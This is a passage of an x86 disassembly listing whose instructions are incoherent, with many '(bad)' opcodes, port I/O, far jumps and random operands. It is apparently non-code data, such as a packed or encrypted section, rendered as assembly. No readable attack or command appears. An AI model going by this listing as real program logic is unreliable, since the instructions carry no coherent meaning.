  414e1d:	mov    WORD PTR [eax-0x5472b243],es
  414e23:	fld    TBYTE PTR [ebx-0x76fd13df]
  414e29:	aaa    
  414e2a:	jp     0x414dbd
  414e2c:	shr    ch,1
  414e2e:	imul   eax
  414e30:	out    dx,eax
  414e31:	xor    BYTE PTR [ebx],ch
  414e33:	or     BYTE PTR [edi],dh
  414e35:	inc    edi
  414e36:	or     DWORD PTR [edi-0x37afe255],ecx
  414e3c:	sbb    cl,BYTE PTR [edi+0x79890ec3]
  414e42:	jo     0x414dd4
  414e44:	jne    0x414dec
  414e46:	rol    BYTE PTR [ecx],1
  414e48:	test   BYTE PTR [esi],0xca
  414e4b:	icebp  
  414e4c:	popa   
  414e4d:	(bad)  [ecx+0xdea6df6]
  414e53:	in     al,0xe5
  414e55:	mov    dh,0xee
  414e57:	xor    ecx,edi
  414e59:	or     DWORD PTR [edi-0x2f],ebp
  414e5c:	(bad)  
  414e5d:	stos   DWORD PTR es:[edi],eax
  414e5e:	pop    edi
  414e5f:	sbb    BYTE PTR [esi],cl
  414e61:	sbb    ch,BYTE PTR [eax]
  414e63:	mov    ch,0xe8
  414e65:	es mov ah,0xd
  414e68:	mov    esi,0x9ca036c8
  414e6d:	push   0x26
  414e6f:	and    BYTE PTR [eax-0x436a06b0],dl
  414e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e76:	retf   0x2292
  414e79:	pop    edx
  414e7a:	mov    esi,0x12d793db
  414e7f:	mov    esi,0xf6578055
  414e84:	mov    ds:0x2ab5d7c,al
  414e89:	mov    esp,0x521861cf
  414e8e:	loope  0x414ebd
  414e90:	xor    DWORD PTR [edx+0x37],edi
  414e93:	sahf   
  414e94:	popa   
  414e95:	inc    edx
  414e96:	std    
  414e97:	fldcw  WORD PTR [ecx]
  414e99:	outs   dx,DWORD PTR ds:[esi]
  414e9a:	xchg   edx,eax
  414e9b:	push   es
  414e9c:	push   eax
  414e9d:	sbb    ebp,DWORD PTR [edx+0x5cdb052b]
  414ea3:	inc    ebp
  414ea4:	ret    
  414ea5:	and    al,0xae
  414ea7:	stos   DWORD PTR es:[edi],eax
  414ea8:	fisub  DWORD PTR [esi-0x3d5c88d2]
  414eae:	into   
  414eaf:	daa    
  414eb0:	add    ecx,DWORD PTR [ebx+0x11]
  414eb3:	dec    ecx
  414eb4:	mov    ebx,gs
  414eb6:	push   esp
  414eb7:	ins    BYTE PTR es:[edi],dx
  414eb8:	mov    esi,0xacc616c1
  414ebd:	mov    ebx,0x481bf43e
  414ec2:	in     eax,0xde
  414ec4:	jecxz  0x414f2e
  414ec6:	mov    ?,WORD PTR [eax+0x70]
  414ec9:	iret   
  414eca:	mov    ch,0xa9
  414ecc:	xor    DWORD PTR [ebx-0x6c7a2a79],eax
  414ed2:	and    bh,BYTE PTR [edx+eax*8-0x51]
  414ed6:	mov    ch,0x4f
  414ed8:	mov    ds:0x17409bf9,eax
  414edd:	xchg   DWORD PTR [edx+0x6e],ebx
  414ee0:	dec    eax
  414ee1:	icebp  
  414ee2:	xchg   esi,eax
  414ee3:	in     eax,0x1d
  414ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ee6:	or     ebp,0x59
  414ee9:	imul   edx,DWORD PTR ds:0xe5673b5c,0xffffff96
  414ef0:	outs   dx,DWORD PTR ds:[esi]
  414ef1:	clc    
  414ef2:	jmp    0xa890:0xb3d30980
  414ef9:	pop    esi
  414efa:	(bad)  
  414efc:	fdiv   st,st(1)
  414efe:	dec    esi
  414eff:	dec    eax
  414f00:	ins    DWORD PTR es:[edi],dx
  414f01:	repnz or eax,0xc6330894
  414f07:	hlt    
  414f08:	or     DWORD PTR [esi-0x3d5fc72f],esi
  414f0e:	jge    0x414eac
  414f10:	jae    0x414ee8
  414f12:	setbe  bh
  414f15:	jo     0x414ecc
  414f17:	jb     0x414f0f
  414f19:	jmp    0x804b52cb
  414f1e:	jg     0x414efd
  414f20:	into   
  414f21:	inc    ebp
  414f22:	rcl    DWORD PTR [edx],cl
  414f24:	push   cs
  414f25:	xor    edx,DWORD PTR [esi]
  414f27:	ret    
  414f28:	mov    ds:0x8de51cbf,al
  414f2d:	pushf  
  414f2e:	clc    
  414f2f:	lds    edx,FWORD PTR [esp+ecx*8+0xb8be959]
  414f36:	push   ebx
  414f37:	cmp    eax,0x8024e708
  414f3c:	xchg   DWORD PTR [ebx],ebp
  414f3e:	mov    bl,BYTE PTR [ebx+0x2430411e]
  414f44:	xchg   DWORD PTR [ecx-0xf],ebx
  414f47:	adc    eax,0x6cd5a94c
  414f4c:	dec    eax
  414f4d:	cmp    DWORD PTR [esi+edi*8+0x76e5a501],ebx
  414f54:	mov    DWORD PTR [ecx],esp
  414f56:	fnsave [edx]
  414f58:	cmc    
  414f59:	loope  0x414f55
  414f5b:	ret    0x7603
  414f5e:	cmp    BYTE PTR [edx+0x79117453],al
  414f64:	ins    DWORD PTR es:[edi],dx
  414f65:	push   esp
  414f66:	icebp  
  414f67:	leave  
  414f68:	in     eax,0xbf
  414f6a:	mov    eax,0xb0b2887a
  414f6f:	lea    ecx,[ebp-0x58]
  414f72:	cmp    DWORD PTR ds:0x526bf052,ecx
  414f78:	cmc    
  414f79:	jo     0x414f80
  414f7b:	dec    ecx
  414f7c:	mov    al,0x91
  414f7e:	push   eax
  414f7f:	jb     0x414f2e
  414f81:	loop   0x414fc6
  414f83:	xor    DWORD PTR [esi],esp
  414f85:	mov    edi,0x95304c89
  414f8a:	jmp    0x129f:0xd8208a8
  414f91:	push   es
  414f92:	popa   
  414f93:	fsubr  DWORD PTR [edi+edi*2]
  414f96:	adc    ebx,DWORD PTR [ebp-0x30]
  414f99:	call   DWORD PTR [ebx]
  414f9b:	icebp  
  414f9c:	pop    edi
  414f9d:	xor    eax,0xcfeb3517
  414fa2:	and    DWORD PTR [eax],0x58329f7e
  414fa8:	inc    edx
  414fa9:	push   ebp
  414faa:	enter  0x6177,0x88
  414fae:	cmp    dl,0x97
  414fb1:	bnd ss ja 0x414f6a
  414fb5:	mov    ds:0xa2c77edd,eax
  414fba:	aas    
  414fbb:	test   eax,0x7690c0e8
  414fc0:	call   0xd033a75b
  414fc5:	mov    ebp,0xe41966
  414fca:	push   ebx
  414fcb:	cmp    BYTE PTR [edx+0x20460a],0xe5
  414fd2:	mov    ds:0xe9f51eba,eax
  414fd7:	jle    0x414f95
  414fd9:	mov    eax,ds:0x248d9c8d
  414fde:	xlat   BYTE PTR ds:[ebx]
  414fdf:	es sbb al,0xfa
  414fe2:	jmp    0x414fe8
  414fe4:	out    dx,eax
  414fe5:	push   ds
  414fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fe7:	clc    
  414fe8:	sti    
  414fe9:	cli    
  414fea:	je     0x415015
  414fec:	mov    ecx,0xf412d920
  414ff1:	mov    edx,DWORD PTR ds:0x1cf030bc
  414ff7:	mov    eax,ds:0x65cd616f
  414ffc:	mov    edx,0xef3b4fc1
  415001:	mov    ch,0x45
  415003:	addr16 mov edi,0x2647b3d9
  415009:	or     eax,DWORD PTR [edx]
  41500b:	rol    DWORD PTR ss:[edi+eax*8-0x5735eb34],0x2b
  415014:	or     BYTE PTR [ebx],dl
  415016:	(bad)  
  415017:	std    
  415018:	mov    eax,0xcbb01fbc
  41501d:	jne    0x415042
  41501f:	mov    al,0x49
  415021:	stos   DWORD PTR es:[edi],eax
  415022:	dec    esi
  415023:	adc    ecx,edx
  415025:	ret    0x5c2c
  415028:	pop    ebx
  415029:	mov    DWORD PTR ds:0xe808d73d,ecx
  41502f:	jb     0x415031
  415031:	adc    al,0x5c
  415033:	inc    edi
  415034:	out    dx,ax
  415036:	pop    ds
  415037:	mov    esp,0x9e564a3d
  41503c:	lock pop esp
  41503e:	jae    0x4150b0
  415040:	(bad)  
  415041:	out    dx,eax
  415042:	ins    BYTE PTR es:[edi],dx
  415043:	and    al,0x72
  415045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415046:	scas   al,BYTE PTR es:[edi]
  415047:	lock mov di,0x3c66
  41504c:	mov    cl,bh
  41504e:	or     al,BYTE PTR [edx]
  415050:	int3   
  415051:	xchg   ecx,eax
  415052:	xlat   BYTE PTR ds:[ebx]
  415053:	out    0x19,eax
  415055:	dec    edi
  415056:	push   ebp
  415057:	test   BYTE PTR [esi],al
  415059:	lods   al,BYTE PTR ds:[esi]
  41505a:	and    bh,BYTE PTR [esi+esi*2-0x527003eb]
  415061:	jle    0x41509d
  415063:	retf   0xa396
  415066:	cmp    DWORD PTR [edi+0x76f92ccc],esp
  41506c:	sub    cl,BYTE PTR [esi]
  41506e:	or     edi,DWORD PTR [esi]
  415070:	sbb    ebx,ecx
  415072:	popf   
  415073:	sti    
  415074:	xlat   BYTE PTR ds:[ebx]
  415075:	punpcklbw mm3,DWORD PTR ds:0x66e15233
  41507c:	idiv   DWORD PTR [esi+0x3a]
  41507f:	dec    ebx
  415080:	push   0x3985f2b8
  415085:	repz call 0xc7a65f8
  41508b:	jb     0x4150c7
  41508d:	(bad)  
  41508e:	mov    dl,0xb9
  415090:	push   ebp
  415091:	test   eax,0xecf75152
  415096:	adc    BYTE PTR [edx+0x14d9b684],ah
  41509c:	cwde   
  41509d:	push   ebp
  41509e:	mov    eax,0xb94247be
  4150a3:	xchg   ecx,eax
  4150a4:	mov    ch,ah
  4150a6:	pop    ebp
  4150a7:	outs   dx,DWORD PTR ds:[esi]
  4150a8:	inc    ecx
  4150a9:	jg     0x4150bd
  4150ab:	xchg   esi,eax
  4150ac:	je     0x41507f
  4150ae:	aas    
  4150af:	mov    ah,0xdd
  4150b1:	ss adc eax,0xd2541421
  4150b7:	or     eax,DWORD PTR [ebp+0x59]
  4150ba:	(bad)  
  4150bb:	imul   ebp,DWORD PTR [ecx+0x63],0x39e41584
  4150c2:	(bad)  
  4150c3:	(bad)  
  4150c4:	mov    esi,0xadfbb338
  4150c9:	xor    BYTE PTR [ebp+0x63ee9c96],bh
  4150cf:	div    BYTE PTR [edi+0xd0f8fe0]
  4150d5:	clc    
  4150d6:	stc    
  4150d7:	sub    al,0x31
  4150d9:	loopne 0x415145
  4150db:	dec    ebp
  4150dc:	out    dx,al
  4150dd:	in     al,0x8a
  4150df:	xchg   edi,eax
  4150e0:	fs mov eax,0x3c4d3037
  4150e6:	(bad)  
  4150e7:	scas   eax,DWORD PTR es:[edi]
  4150e8:	adc    cl,BYTE PTR [ebx-0x5f]
  4150eb:	call   FWORD PTR [edx+eiz*1-0x46c8384c]
  4150f2:	mov    ebx,0xf7577ce3
  4150f7:	in     al,dx
  4150f8:	xchg   BYTE PTR [esi],dh
  4150fa:	mov    bh,0x3f
  4150fc:	repnz mov al,0x4e
  4150ff:	fmul   DWORD PTR [edi]
  415101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415102:	(bad)  
  415103:	in     al,0xed
  415105:	(bad)  
  415106:	aam    0x8e
  415108:	sbb    DWORD PTR [ecx-0x74],0x73
  41510c:	shr    DWORD PTR [esi-0x76],1
  41510f:	cmp    eax,0xfb105527
  415114:	imul   esp,DWORD PTR [edi-0x24d5dad1],0x68671096
  41511e:	and    edx,DWORD PTR [edx]
  415120:	mov    bl,0x60
  415122:	push   0x63f7ee64
  415127:	mov    ecx,0x2b98b01f
  41512c:	test   al,0x8
  41512e:	inc    ebp
  41512f:	or     eax,0x42ef216a
  415134:	dec    esi
  415135:	sub    DWORD PTR [edx+0x12bb1f1d],ecx
  41513b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41513c:	out    0x46,al
  41513e:	mov    eax,ds:0xa4d5f914
  415143:	and    esi,ecx
  415145:	push   ss
  415146:	sub    DWORD PTR [esi-0x1eaad391],edi
  41514c:	sub    eax,0xd1331943
  415151:	add    al,0x83
  415153:	inc    ebp
  415154:	xor    bl,al
  415156:	ins    BYTE PTR es:[edi],dx
  415157:	lods   al,BYTE PTR ds:[esi]
  415158:	xchg   ebx,eax
  415159:	shl    BYTE PTR [ebx+eax*8+0x3cdeba1],0x39
  415161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415162:	enter  0xd332,0xf1
  415166:	cmp    ecx,ecx
  415168:	ret    
  415169:	mov    edx,0x7e0bc6b9
  41516e:	mov    DWORD PTR [ebp-0x1a724342],ebx
  415174:	xchg   edi,eax
  415175:	ja     0x415193
  415177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415178:	stos   BYTE PTR es:[edi],al
  415179:	or     BYTE PTR [edx],bl
  41517b:	shr    edi,1
  41517d:	xor    BYTE PTR [edi+0x770446d6],cl
  415183:	in     al,0x38
  415185:	push   edi
  415186:	mov    edx,0xb1e050a3
  41518b:	out    0x67,al
  41518d:	xchg   ebp,eax
  41518e:	mov    ebp,0x4f02132f
  415193:	sbb    BYTE PTR [eax+eax*1],dh
  415196:	rcr    DWORD PTR [ebx+eax*4],0x1
  41519a:	mov    esi,0x498abbc0
  41519f:	mov    edi,edi
  4151a1:	retf   
  4151a2:	xchg   edi,eax
  4151a3:	arpl   cx,dx
  4151a5:	mov    esp,0x2a65bce
  4151aa:	scas   al,BYTE PTR es:[edi]
  4151ab:	or     BYTE PTR cs:[ebp+0x6583ca9f],0xb7
  4151b3:	loope  0x415146
  4151b5:	dec    edx
  4151b6:	push   esi
  4151b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b8:	and    eax,0x933e963b
  4151bd:	pusha  
  4151be:	arpl   sp,cx
  4151c0:	add    eax,0x20770782
  4151c5:	ffreep st(1)
  4151c7:	test   eax,0x45095fa7
  4151cc:	pop    eax
  4151cd:	daa    
  4151ce:	add    eax,0x2a785d9b
  4151d3:	ds and eax,0xdbf772d7
  4151d9:	je     0x4151d1
  4151db:	inc    edi
  4151dc:	or     DWORD PTR [eax+ebx*1+0x58],eax
  4151e0:	or     al,0x7
  4151e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e3:	icebp  
  4151e4:	cmp    edi,DWORD PTR [ecx+0x313e36d8]
  4151ea:	in     eax,0xe1
  4151ec:	push   cs
  4151ed:	data16 lods al,BYTE PTR ds:[esi]
  4151ef:	sahf   
  4151f0:	add    bl,BYTE PTR [esi-0x48]
  4151f3:	test   edi,edi
  4151f5:	mov    bh,0x69
  4151f7:	mov    ch,bh
  4151f9:	mov    eax,ds:0xc160e3ca
  4151fe:	mov    ecx,0x29acd1ae
  415203:	sbb    eax,0x96b94f12
  415208:	mov    esp,0x5a704982
  41520d:	in     eax,0x20
  41520f:	mov    ?,ebp
  415211:	push   esi
  415212:	mov    edx,0x25e34fbb
  415217:	push   esp
  415218:	adc    cl,dl
  41521a:	jbe    0x41525c
  41521c:	and    al,BYTE PTR [edx+0x44]
  41521f:	pop    esi
  415220:	mov    al,0xdc
  415222:	adc    al,0xda
  415224:	shr    ah,0xd0
  415227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415228:	ret    
  415229:	aaa    
  41522a:	mov    ds:0xdf808ba0,al
  41522f:	es xchg ebp,eax
  415231:	jne    0x41523a
  415233:	lea    esi,[ebx-0x2]
  415236:	jns    0x4151b8
  415238:	and    dl,bl
  41523a:	stos   DWORD PTR es:[edi],eax
  41523b:	pop    edx
  41523c:	sub    ebx,DWORD PTR [eax-0x8]
  41523f:	jbe    0x41523e
  415241:	fiadd  DWORD PTR [ebx]
  415243:	jno    0x4151f6
  415245:	cmp    DWORD PTR [ebx-0x67ae5fb2],0xa7e97d8c
  41524f:	push   cs
  415250:	push   edi
  415251:	leave  
  415252:	pop    esp
  415253:	xchg   edi,eax
  415254:	jle    0x415256
  415256:	hlt    
  415257:	ins    DWORD PTR es:[edi],dx
  415258:	lods   al,BYTE PTR ds:[esi]
  415259:	push   esp
  41525a:	xchg   BYTE PTR [ebp-0x21359287],bh
  415260:	sub    esi,edi
  415262:	xchg   edx,eax
  415263:	push   ss
  415264:	and    BYTE PTR [esi],bl
  415266:	mul    BYTE PTR gs:[ecx+0x0]
  41526a:	add    ebx,DWORD PTR [esi-0x12721508]
  415270:	jo     0x415216
  415272:	retf   0x6843
  415275:	int    0x2f
  415277:	cmc    
  415278:	in     al,0xba
  41527a:	sbb    al,0xed
  41527c:	mov    eax,ds:0x7d1bb335
  415281:	dec    edi
  415282:	xchg   ebx,eax
  415283:	popf   
  415284:	pop    ds
  415285:	call   0xa15a4007
  41528a:	shl    BYTE PTR [ebp-0x1f],0xc7
  41528e:	es inc ebp
  415290:	dec    esi
  415291:	pop    esi
  415292:	test   ah,ch
  415294:	cmp    BYTE PTR fs:[ebx],dh
  415297:	shl    BYTE PTR [eax+0xb1110fe],0xfe
  41529e:	pop    eax
  41529f:	lds    esi,FWORD PTR [edx]
  4152a1:	dec    eax
  4152a2:	dec    esp
  4152a3:	lds    esi,FWORD PTR [ebp-0x42]
  4152a6:	dec    edx
  4152a7:	loopne 0x4152c9
  4152a9:	sbb    DWORD PTR [ebp-0x5d],edx
  4152ac:	push   ebp
  4152ad:	xchg   esp,eax
  4152ae:	lock or ah,BYTE PTR es:0x74f5772d
  4152b6:	test   al,0x85
  4152b8:	xor    al,0x3e
  4152ba:	sti    
  4152bb:	push   ebx
  4152bc:	xor    eax,0xa99f7085
  4152c1:	(bad)  
  4152c2:	sti    
  4152c3:	int3   
  4152c4:	jmp    0xd1a605e1
  4152c9:	and    edi,edi
  4152cb:	jns    0x41534b
  4152cd:	cli    
  4152ce:	std    
  4152cf:	in     eax,dx
  4152d0:	mov    cl,0xeb
  4152d2:	add    DWORD PTR [esi],0x883922f3
  4152d8:	bound  ebp,QWORD PTR [eax-0x2c]
  4152db:	pop    ds
  4152dc:	popf   
  4152dd:	and    eax,0xae7d123a
  4152e2:	mov    bl,0xbd
  4152e4:	adc    esp,DWORD PTR [eax]
  4152e6:	add    ch,BYTE PTR [esi-0x6d]
  4152e9:	cdq    
  4152ea:	and    eax,0x46adbb16
  4152ef:	pop    edx
  4152f0:	int    0x1e
  4152f2:	fcom   st(4)
  4152f4:	rol    al,cl
  4152f6:	sbb    eax,0x216dd18a
  4152fb:	daa    
  4152fc:	stos   DWORD PTR es:[edi],eax
  4152fd:	test   eax,0x5ecd7f86
  415302:	jnp    0x41530e
  415304:	mov    DWORD PTR [edx],esp
  415306:	bts    DWORD PTR [ecx],0x2e
  41530a:	push   ss
  41530b:	cwde   
  41530c:	jne    0x41533d
  41530e:	(bad)  
  41530f:	jge    0x415307
  415311:	sbb    DWORD PTR ds:0xb59ac43f,ebx
  415317:	scas   eax,DWORD PTR es:[edi]
  415318:	ds pause 
  41531b:	inc    eax
  41531c:	jo     0x415329
  41531e:	test   DWORD PTR [esp+ebx*2],esp
  415321:	loop   0x4152e6
  415323:	sbb    al,0xbf
  415325:	(bad)  
  415326:	mov    dl,0x5e
  415328:	xor    edx,0x26c0522d
  41532e:	ss std 
  415330:	and    eax,0x35c32817
  415335:	xor    edi,edx
  415337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415338:	inc    eax
  415339:	ror    DWORD PTR [eax-0x61710e95],0x85
  415340:	stos   DWORD PTR es:[edi],eax
  415341:	mov    ebx,ecx
  415343:	xchg   esi,eax
  415344:	sub    bh,BYTE PTR [edx+ebp*4-0x71]
  415348:	enter  0x1a1c,0x4f
  41534c:	xor    DWORD PTR [edx+0x6ee05c4e],edx
  415352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415353:	ret    
  415354:	cmc    
  415355:	rep lods eax,DWORD PTR ds:[esi]
  415357:	not    esp
  415359:	(bad)  
  41535a:	clc    
  41535b:	inc    BYTE PTR [edx-0x344f1daa]
  415361:	lods   al,BYTE PTR ds:[esi]
  415362:	push   0xffffffdb
  415364:	pop    eax
  415365:	sar    ebp,cl
  415367:	dec    eax
  415368:	inc    eax
  415369:	xchg   ebx,eax
  41536a:	xlat   BYTE PTR ds:[ebx]
  41536b:	sub    al,BYTE PTR [eax-0x13f1e54b]
  415371:	or     BYTE PTR [ebx+0x2676d11c],bh
  415377:	repnz mov ecx,0x15f1119d
  41537d:	xchg   edi,eax
  41537e:	or     BYTE PTR [ecx+0x5b721e7e],cl
  415384:	sub    al,0x24
  415386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415387:	mov    ah,0x46
  415389:	inc    DWORD PTR [ebx+0x2709f5ca]
  41538f:	popf   
  415390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415391:	push   0xff0e05a3
  415396:	adc    eax,DWORD PTR [edx-0x68382b74]
  41539c:	lock mov esp,0x90336209
  4153a2:	(bad)  
  4153a3:	jno    0x41534a
  4153a5:	cld    
  4153a6:	(bad)  
  4153a7:	scas   al,BYTE PTR es:[edi]
  4153a8:	mov    fs,WORD PTR [eiz*8-0x4c3b087b]
  4153af:	out    0xfb,eax
  4153b1:	jne    0x415357
  4153b3:	push   edx
  4153b4:	pop    ebx
  4153b5:	xchg   ebp,eax
  4153b6:	mov    cl,0x2e
  4153b8:	(bad)  
  4153b9:	push   eax
  4153ba:	mov    ebx,ebx
  4153bc:	ins    DWORD PTR es:[edi],dx
  4153bd:	add    DWORD PTR fs:[ebp+0x28692ecc],0x6d6d5161
  4153c8:	inc    ebp
  4153c9:	cmp    DWORD PTR [edx+0x6f],0x754b32c7
  4153d0:	mov    ebx,ecx
  4153d2:	xor    al,BYTE PTR [edi]
  4153d4:	inc    esi
  4153d5:	xor    DWORD PTR [eax+eax*1-0x463f7a7c],edi
  4153dc:	shr    ch,cl
  4153de:	or     DWORD PTR [ebp+0x5b],0x13
  4153e2:	dec    edi
  4153e3:	mov    edx,0x322ab9b3
  4153e8:	cmc    
  4153e9:	lock adc eax,0xd1bbb8b2
  4153ef:	stos   DWORD PTR es:[edi],eax
  4153f0:	xlat   BYTE PTR ds:[ebx]
  4153f1:	jg     0x4153bf
  4153f3:	cmp    eax,0x54fcd294
  4153f8:	mov    edx,0x15dd8d62
  4153fd:	mov    edx,0x6e37f097
  415402:	les    esp,FWORD PTR [esp+eax*8-0x4c13e76]
  415409:	outs   dx,BYTE PTR ds:[esi]
  41540a:	xchg   esp,eax
  41540b:	loopne 0x4153fb
  41540d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41540e:	popf   
  41540f:	pop    ss
  415410:	daa    
  415411:	arpl   cx,si
  415413:	int    0xe6
  415415:	and    eax,0xf035c7ea
  41541a:	(bad)  
  41541b:	sahf   
  41541c:	jecxz  0x41546a
  41541e:	push   ebp
  41541f:	loope  0x415448
  415421:	call   0x3a91:0x33bdbd
  415428:	iret   
  415429:	mov    ecx,0x3ae554be
  41542e:	xchg   edx,eax
  41542f:	sahf   
  415430:	jmp    0x9624:0xe769fef
  415437:	xor    eax,0x7293f2a2
  41543c:	out    dx,al
  41543d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41543e:	push   es
  41543f:	mov    cl,0x80
  415441:	stc    
  415442:	scas   eax,DWORD PTR es:[edi]
  415443:	push   esp
  415444:	push   0xa7644bec
  415449:	inc    ebp
  41544a:	mov    ebp,0x3de1f7be
  41544f:	mov    dh,0x2f
  415451:	add    DWORD PTR [esi+0x70],ebx
  415454:	aam    0x1a
  415456:	sti    
  415457:	or     BYTE PTR [edi+0x33b56f4a],ch
  41545d:	cmp    BYTE PTR [esi],ch
  41545f:	loope  0x4154b9
  415461:	fdivr  QWORD PTR [edx+0x2e6ed77f]
  415467:	mov    ah,0x5
  415469:	les    edx,FWORD PTR [ecx-0x29]
  41546c:	mov    ah,0x50
  41546e:	test   DWORD PTR [eax+esi*2+0x22084a2b],ebx
  415475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415476:	mov    eax,0x86263744
  41547b:	shr    DWORD PTR ds:0x914c6c29,0xc5
  415482:	mov    ebp,DWORD PTR [edx+0x73a64f2c]
  415488:	mov    ebp,ecx
  41548a:	add    al,0x5
  41548c:	jmp    0x415500
  41548e:	cmc    
  41548f:	aaa    
  415490:	pusha  
  415491:	xlat   BYTE PTR ds:[ebx]
  415492:	jecxz  0x415449
  415494:	xchg   DWORD PTR [ebp+0x7de82b4a],ebx
  41549a:	jmp    0x4154d2
  41549c:	fimul  DWORD PTR [esi+ebp*4+0x27]
  4154a0:	mov    edi,0xd2dbb12b
  4154a5:	imul   edi,DWORD PTR [ecx],0x68ebabb2
  4154ab:	or     DWORD PTR [ebp+0x2a510d4f],edx
  4154b1:	int3   
  4154b2:	push   eax
  4154b3:	imul   edi,DWORD PTR [ecx],0x53
  4154b6:	shl    esp,1
  4154b8:	dec    edx
  4154b9:	mov    bh,0xbb
  4154bb:	ss leave 
  4154bd:	dec    esp
  4154be:	xchg   bl,ch
  4154c0:	leave  
  4154c1:	and    DWORD PTR [ecx+0xefb16af],0x3e4e414a
  4154cb:	mov    eax,0xcc5396a7
  4154d0:	inc    ebp
  4154d1:	std    
  4154d2:	imul   edx,esi,0xa45b73ac
  4154d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d9:	repnz add BYTE PTR [edi+0x5b80448b],ah
  4154e0:	test   esp,ebx
  4154e2:	test   eax,0x2f8ffe2e
  4154e7:	int    0x84
  4154e9:	out    0xbd,eax
  4154eb:	cmovs  edx,DWORD PTR [edi+0x57]
  4154ef:	fist   WORD PTR [ecx-0x6325d016]
  4154f5:	mov    edi,0xec2da427
  4154fa:	sbb    eax,0x1e0d0808
  4154ff:	xor    ah,dl
  415501:	in     eax,0xbe
  415503:	xchg   esp,eax
  415504:	mov    bh,0xb8
  415506:	imul   ecx,esp,0x37
  415509:	ret    
  41550a:	push   ecx
  41550b:	push   es
  41550c:	out    dx,al
  41550d:	mov    bh,0x1d
  41550f:	imul   esp,DWORD PTR [edx+0x638a9807],0xea3c1357
  415519:	push   ebp
  41551a:	ja     0x415522
  41551c:	push   es
  41551d:	lods   al,BYTE PTR ds:[esi]
  41551e:	repz enter 0x7910,0x32
  415523:	or     ecx,DWORD PTR [ecx]
  415525:	pushf  
  415526:	sub    cl,BYTE PTR [ebx+0x741d0689]
  41552c:	loope  0x4154d9
  41552e:	xchg   esp,eax
  41552f:	mov    bh,0x58
  415531:	sub    eax,0xaa67270e
  415536:	xchg   ecx,eax
  415537:	and    edx,DWORD PTR [edx]
  415539:	scas   eax,DWORD PTR es:[edi]
  41553a:	xchg   BYTE PTR ds:0x7177460f,bl
  415540:	xchg   ecx,eax
  415541:	mov    dl,ah
  415543:	lods   al,BYTE PTR ds:[esi]
  415544:	and    edi,DWORD PTR [edi-0x15]
  415547:	mov    ?,WORD PTR [ecx+0x6f3aae5d]
  41554d:	jno    0x41559d
  41554f:	les    ebp,FWORD PTR [edi+0x50ad3236]
  415555:	ss mov ebp,0xe9dd55b8
  41555b:	mov    bh,0x76
  41555d:	out    0x80,eax
  41555f:	imul   BYTE PTR [ebx+0xe]
  415562:	sub    eax,0x63e2e004
  415567:	and    al,0x93
  415569:	ret    
  41556a:	xchg   ebx,eax
  41556b:	mov    BYTE PTR [ebx+0x2d],ah
  41556e:	ja     0x41550a
  415570:	ins    DWORD PTR es:[edi],dx
  415571:	les    edi,FWORD PTR [eax]
  415573:	arpl   WORD PTR es:[esp+edx*2+0x7b7bf1ba],ax
  41557b:	dec    BYTE PTR [eax-0x3e]
  41557e:	shl    dh,0xbc
  415581:	jmp    0x2cb9:0x2a94061e
  415588:	popf   
  415589:	rcl    ebp,1
  41558b:	fs push cs
  41558d:	scas   eax,DWORD PTR es:[edi]
  41558e:	mov    edi,DWORD PTR [edi-0xbb76716]
  415594:	or     edx,esi
  415596:	mov    esp,0x34feb7e6
  41559b:	sub    dl,ah
  41559d:	shr    BYTE PTR [ecx],0xa8
  4155a0:	sahf   
  4155a1:	pop    DWORD PTR ss:[ebx-0x2b]
  4155a5:	sub    bh,BYTE PTR [ebx+0x10]
  4155a8:	sbb    bl,BYTE PTR [ebp-0x1358289b]
  4155ae:	sbb    eax,0x514ce286
  4155b3:	fld    QWORD PTR [eax+ebp*2-0x3]
  4155b7:	pop    eax
  4155b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b9:	dec    edx
  4155ba:	loope  0x4155bf
  4155bc:	xchg   esp,eax
  4155bd:	jno    0x4155e9
  4155bf:	xchg   ecx,eax
  4155c0:	adc    al,0x94
  4155c2:	(bad)  
  4155c3:	imul   edi,DWORD PTR [eax+0x7b81a568],0x6d2e1746
  4155cd:	test   eax,0xc3974eda
  4155d2:	jmp    0x4e3c:0x1adcfbc2
  4155d9:	or     eax,0x23e7f33d
  4155de:	cmp    BYTE PTR [ebp-0x6d80ba55],0xd2
  4155e5:	rcl    DWORD PTR [ebx-0x2b77d398],cl
  4155eb:	inc    ecx
  4155ec:	dec    edx
  4155ed:	and    al,0xcc
  4155ef:	jae    0x4155bd
  4155f1:	jno    0x4155e3
  4155f3:	ds jg  0x415585
  4155f6:	pop    edi
  4155f7:	sbb    bl,ah
  4155f9:	jb     0x415632
  4155fb:	push   ebp
  4155fc:	ret    0x5122
  4155ff:	push   ds
  415600:	sub    DWORD PTR fs:[edi],eax
  415603:	inc    ebx
  415604:	inc    ebp
  415605:	mov    bl,0xb
  415607:	dec    esi
  415608:	imul   edx,DWORD PTR [edi],0xffffff87
  41560b:	in     eax,0xe8
  41560d:	xchg   ecx,eax
  41560e:	and    dl,bl
  415610:	pushf  
  415611:	or     DWORD PTR [edi+esi*1+0x6dc9d8d6],esp
  415618:	fsubr  DWORD PTR [edi]
  41561a:	repz mov esp,0xd3485657
  415620:	ficom  DWORD PTR gs:[ebx+0x7d]
  415624:	nop
  415625:	or     BYTE PTR [ecx],bl
  415627:	lock fbld TBYTE PTR [eax]
  41562a:	jl     0x415636
